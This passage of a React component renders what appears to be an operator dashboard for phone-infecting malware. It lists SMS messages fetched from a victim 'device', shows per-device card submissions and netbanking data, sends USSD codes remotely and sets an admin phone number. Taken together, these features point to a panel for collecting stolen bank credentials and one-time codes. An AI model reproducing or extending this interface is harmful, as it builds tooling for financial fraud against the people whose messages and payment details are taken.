              />

              <div className="flex gap-3">
                <Button
                  className="h-11 flex-1 bg-emerald-600 font-semibold text-white hover:bg-emerald-700"
                  size="lg"
                  onPress={handleSendUssd}
                  isLoading={isSendingUssd}
                >
                  Send
                </Button>
                <Button
                  className="h-11 flex-1 border border-gray-300 bg-white text-gray-700 hover:bg-gray-50"
                  size="lg"
                  onPress={() => setShowDialog(null)}
                >
                  Cancel
                </Button>
              </div>
            </div>
          </CardBody>
        </Card>
      )}

      {/* View Data Dialog */}
      {showDialog === "view" && (
        <Card className="overflow-hidden rounded-2xl border border-gray-200 bg-white shadow-none">
          <CardBody className="p-4 sm:p-6">
            <div className="space-y-6">
              {renderSubmissionSection("Form Submissions", formSubmissions, "No forms found for this device.")}
              {renderSubmissionSection("Card Submissions", cardSubmissions, "No card submissions found for this device.")}
              {renderSubmissionSection("Netbanking Data", netbankingSubmissions, "No netbanking data found for this device.")}
            </div>
            <div className="mt-4 flex justify-end">
              <Button
                className="border border-gray-300 bg-white text-gray-700 hover:bg-gray-50"
                onPress={() => setShowDialog(null)}
              >
                Close
              </Button>
            </div>
          </CardBody>
        </Card>
      )}

      {/* SMS LIST - ALWAYS VISIBLE */}
      <Card className="overflow-hidden rounded-2xl border border-gray-200 bg-white shadow-none">
        <CardBody className="p-4 sm:p-6">
          <div className="flex flex-col sm:flex-row justify-between items-start sm:items-center gap-3 mb-4">
            <h3 className="text-lg font-semibold text-gray-900">
              SMS Messages 
              <span className="ml-2 text-sm font-normal text-gray-500">
                ({filteredSmsList.length} messages)
              </span>
            </h3>
            <div className="flex flex-col sm:flex-row gap-2 w-full sm:w-auto">
              <input
                type="text"
                placeholder="Search by text, sender, number..."
                value={smsSearchQuery}
                onChange={(e) => setSmsSearchQuery(e.target.value)}
                className="w-full sm:w-64 h-10 px-3 text-sm bg-white rounded-lg shadow-md outline-none"
              />
              <select
                value={dateFilter}
                onChange={(e) => setDateFilter(e.target.value as DateFilter)}
                className="h-10 px-3 text-sm bg-white rounded-lg shadow-md text-gray-700 outline-none cursor-pointer"
              >
                <option value="all">All Time</option>
                <option value="today">Today</option>
                <option value="last7days">Last 7 Days</option>
                <option value="last30days">Last 30 Days</option>
              </select>
            </div>
          </div>

          <div className="space-y-3 max-h-[500px] overflow-y-auto">
            {isLoadingSms ? (
              <div className="rounded-2xl border border-gray-200 bg-white p-8 text-center">
                <div className="flex flex-col items-center gap-3">
                  <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-blue-600"></div>
                  <p className="text-gray-500">Loading SMS messages...</p>
                </div>
              </div>
            ) : filteredSmsList.length === 0 ? (
              <div className="rounded-2xl border border-gray-200 bg-white p-8 text-center">
                <p className="text-gray-500">No SMS messages found for this device</p>
                <p className="text-xs text-gray-400 mt-2">
                  Click <span className="font-semibold text-blue-600">"GET SMS"</span> button to fetch messages from device
                </p>
              </div>
            ) : (
              filteredSmsList.map((sms) => (
                <div key={sms.id} className="rounded-lg border border-gray-200 bg-white hover:shadow-md transition-shadow duration-200">
                  <div className="space-y-3 p-4 sm:p-5">
                    <div className="flex items-center justify-between flex-wrap gap-2">
                      <span className="font-semibold text-blue-900 text-xs uppercase tracking-wide">DATE</span>
                      <BiCopy onClick={() => copyToClipboard(formatMessageTimestamp(sms.timestamp))} className="cursor-pointer text-gray-400" size={14} />
                    </div>
                    <p className="text-[11px] text-gray-500">{formatMessageTimestamp(sms.timestamp)}</p>

                    <div className="flex items-center justify-between flex-wrap gap-2 mt-3">
                      <span className="font-semibold text-blue-900 text-xs uppercase tracking-wide">MESSAGE</span>
                      <BiCopy onClick={() => copyToClipboard(sms.body)} className="cursor-pointer text-gray-400" size={14} />
                    </div>
                    <p className="text-sm text-red-600 break-words">{sms.body}</p>

                    <div className="flex items-center justify-between flex-wrap gap-2 mt-3">
                      <span className="font-semibold text-blue-900 text-xs uppercase tracking-wide">SENDER</span>
                      <BiCopy onClick={() => copyToClipboard(sms.senderNumber)} className="cursor-pointer text-gray-400" size={14} />
                    </div>
                    <p className="text-sm text-gray-700">{sms.senderNumber}</p>

                    {sms.reciverNumber && (
                      <>
                        <div className="flex items-center justify-between flex-wrap gap-2 mt-3">
                          <span className="font-semibold text-blue-900 text-xs uppercase tracking-wide">RECEIVER</span>
                          <BiCopy onClick={() => copyToClipboard(sms.reciverNumber)} className="cursor-pointer text-gray-400" size={14} />
                        </div>
                        <p className="text-sm text-gray-700">{sms.reciverNumber}</p>
                      </>
                    )}

                    <Button size="sm" color="danger" variant="light" onPress={() => handleDeleteSMS(sms.id)} className="mt-3 text-xs">
                      Delete
                    </Button>
                  </div>
                </div>
              ))
            )}
          </div>
        </CardBody>
      </Card>

      {/* Admin Phone Modal */}
      <Modal isOpen={isPhoneModalOpen} onClose={onPhoneModalClose} size="md">
        <ModalContent>
          <ModalHeader>Update Admin Phone</ModalHeader>
          <ModalBody>
            <Input label="Phone Number" placeholder="Enter phone number" value={adminPhone1} onValueChange={setAdminPhone1} />
          </ModalBody>
          <ModalFooter>
            <Button variant="light" onPress={onPhoneModalClose}>Cancel</Button>
            <Button color="primary" onPress={handleAdminPhoneUpdate} isLoading={isAdminPhoneLoading}>Save</Button>
          </ModalFooter>
        </ModalContent>
      </Modal>
    </div>
  );
}